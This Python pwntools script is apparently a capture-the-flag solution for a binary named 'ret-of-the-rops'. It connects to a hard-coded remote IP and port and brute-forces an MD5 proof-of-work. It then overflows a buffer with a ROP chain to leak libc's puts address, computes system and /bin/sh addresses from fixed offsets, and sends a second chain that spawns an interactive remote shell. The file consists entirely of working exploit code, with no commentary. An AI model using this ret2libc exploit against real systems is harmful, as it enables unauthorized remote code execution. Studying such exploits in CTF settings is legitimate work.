#!/usr/bin/env python3

from pwn import *
import string
import itertools
import hashlib
import binascii

def hash_finder(md5_hash):
    wordlist = []
    for i in itertools.permutations(list(string.ascii_lowercase),4):
        wordlist.append(i)
    for i in wordlist:
        hashed = str(hashlib.md5("".join(i).encode()).hexdigest())
        if(md5_hash == hashed[-6:]):
            return "".join(i).encode()

while(True):
    try:
        e = ELF("./ret-of-the-rops")
        r = remote("161.97.176.150",2222)
        md5_hash = r.recvline().decode().split()[-1]
        plaintext = hash_finder(md5_hash)
        r.sendline(plaintext)
        r.recvline()
        r.recvline()
        libc_leaker = b'A' * 39 + b"\x00" 
        rop = ROP(e)
        pop_rdi = rop.find_gadget(['pop rdi'])[0]
        libc_leaker+=p64(pop_rdi)+p64(e.got['puts'])+p64(e.plt['puts'])+p64(e.symbols['main'])
        r.sendline(libc_leaker)
        r.recv()
        address = r.recvline().rstrip()
        print(r.recvline())
        i = 0
        leaked_libc_value= 0 
        len_address = len(address)
        for k in address:
            leaked_libc_value+= (int(k)*(16**i))
            i+=2
        ret = rop.find_gadget(['ret'])[0]
        log.info("Leaked libc address " + str(hex(leaked_libc_value)))
        base_address = leaked_libc_value - 554400
        log.info("Base address of libc is " + str(hex(base_address)))
        system_address = base_address + 349200
        log.info("Address of system function is " + str(hex(system_address)))
        bin_sh = base_address + 1799594
        log.info("Address of /bin/sh is " + str(hex(bin_sh)))
        exploit = b'A' * 39 + b"\x00" + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system_address)
        r.sendline(exploit)
        r.interactive()
        r.close()
        break
    except AttributeError:
        print("\nRestart")
        continue
